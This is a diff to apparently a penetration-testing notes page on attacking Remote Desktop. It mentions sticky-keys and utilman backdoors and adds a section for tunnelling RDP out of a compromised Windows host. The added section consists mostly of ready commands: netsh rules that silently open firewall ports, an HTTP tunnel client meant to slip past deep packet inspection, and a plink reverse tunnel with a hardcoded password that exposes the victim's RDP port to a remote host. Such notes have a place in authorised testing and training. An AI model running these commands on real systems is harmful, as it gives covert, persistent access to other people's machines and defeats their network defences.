@@ -107,6 +107,23 @@ ts::remote /id:2    // Connect to the session
 Combining stickykeys or utilman techniques *you will be able to access a administrative CMD and any RDP session anytime*. *RDPs that have been backdoored with one of these techniques already with: [Stick  Keys Slayer](https://github.com/linuz/Sticky-Keys-Slayer)*
 
 Shadow Attack - [AutoRDPwn](https://github.com/JoelGMSec/AutoRDPwn)
+
+## Tunnelling Remote Desktop Protocol (RDP) 
+
+Tunnelling Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel as method of bypassing deep packet inspection from [GitHub OlivierLaflamme/Cheatsheet-God Cheatsheet_Networking.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_Networking.txt). From target Windows machine add required firewall rules without prompting the user:
+```powershell
+netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes
+netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000
+netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080
+netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079
+
+# Start the http tunnel client
+httptunnel_client.exe
+
+# Create HTTP reverse shell by connecting to localhost port 3000
+plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 3000
+```
+
 ## References
 
 [Wikipedia Network Level Authentication (NLA)](https://en.wikipedia.org/wiki/Network_Level_Authentication)
@@ -114,3 +131,4 @@ Shadow Attack - [AutoRDPwn](https://github.com/JoelGMSec/AutoRDPwn)
 [HackTricks - Pentesting RDP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp)
 [AutoRDPwn](https://github.com/JoelGMSec/AutoRDPwn)
 [Stick  Keys Slayer](https://github.com/linuz/Sticky-Keys-Slayer)
+[GitHub OlivierLaflamme/Cheatsheet-God Cheatsheet_Networking.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_Networking.txt)
